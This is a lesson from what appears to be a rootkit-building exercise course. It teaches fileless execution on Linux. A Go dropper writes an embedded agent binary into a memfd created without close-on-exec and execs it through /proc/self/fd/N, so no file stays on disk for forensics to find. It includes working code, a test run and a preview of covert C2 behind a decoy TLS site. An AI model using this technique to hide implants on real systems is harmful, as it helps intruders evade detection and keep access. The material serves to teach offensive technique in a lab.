# L21: Fileless Agent Execution

L20 loaded a kernel module without writing a .ko to disk.
But the loader binary itself was a file.
And any agent binary you deploy is a file too.
Forensics finds both with a simple `find`.

The MagisterQuis technique eliminates the binary from disk entirely.
The process runs, but there is no file backing it.

## memfd + exec through /proc/self/fd

The trick is the same building block (memfd_create) with one critical difference:
no `MFD_CLOEXEC`.

```text
  agent bytes (embedded in dropper via go:embed)
       |
       v
  memfd_create("", 0)            <-- NO MFD_CLOEXEC
       |  fd survives exec because close-on-exec is not set
       v
  write agent bytes to fd
       |
       v
  delete the memfd name           <-- optional, hides from /proc/pid/fd
       |  (empty string name already does this)
       v
  exec("/proc/self/fd/N", argv)
       |  kernel reads the ELF from the memfd
       |  replaces dropper process with agent
       v
  agent is running
  /proc/pid/exe -> "/memfd: (deleted)"
  no file on disk
```

Why no `MFD_CLOEXEC`: exec replaces the current process image.
Close-on-exec flags cause the kernel to close the fd before the new process
starts.
But exec needs to read the ELF from that fd.
If the fd is closed, exec fails with ENOENT.

Why `/proc/self/fd/N`: exec needs a path.
A memfd has no directory entry, but every open fd has a symlink at
`/proc/self/fd/<number>`.
The kernel follows this symlink and reads the executable from the memfd.

After exec, the original memfd name is gone.
`/proc/pid/exe` points to something like `/memfd: (deleted)`.
There is no file on disk to find.

## You write

`main.go` (~8 lines of logic):

- Create a memfd without `MFD_CLOEXEC`
- Write the embedded agent bytes to the memfd
- Build the `/proc/self/fd/N` path
- Exec into the agent via `unix.Exec`

## API

```go
import "golang.org/x/sys/unix"

// Create memfd WITHOUT MFD_CLOEXEC. The fd must survive exec.
fd, err := unix.MemfdCreate("", 0)

// Write the agent binary to the memfd.
n, err := unix.Write(fd, agentBytes)

// Build the path to the fd.
path := fmt.Sprintf("/proc/self/fd/%d", fd)

// Replace this process with the agent.
// argv[0] can be anything (used for process name in ps).
// envv can be nil or os.Environ().
err = unix.Exec(path, []string{"agent"}, nil)
```

```go
import _ "embed"

//go:embed agent
var agentBytes []byte
```

## Test it

```
$ rklings build l21
$ rklings run l21
student@vm:~$ ./dropper &
student@vm:~$ ps aux | grep agent
student   1234  0.0  0.1  12345  6789 ?  S  00:00  0:00 agent
student@vm:~$ ls -la /proc/1234/exe
lrwxrwxrwx 1 student student 0 ... /proc/1234/exe -> /memfd: (deleted)
student@vm:~$ find / -name 'agent' -type f 2>/dev/null
student@vm:~$
```

The agent is running.
`/proc/pid/exe` shows `(deleted)` because it points to a memfd, not a real file.
No binary exists on disk.

## Validate

```
$ rklings validate l21
  [+] agent process is running
  [+] no agent binary on disk
  [+] /proc/pid/exe shows (deleted)
  PASS
```

## Next

The module loads without a file.
The agent runs without a file.
L22 adds the last piece of network tradecraft: a single TLS port that serves a
decoy website to browsers and C2 to the agent, distinguished only by client
certificate.
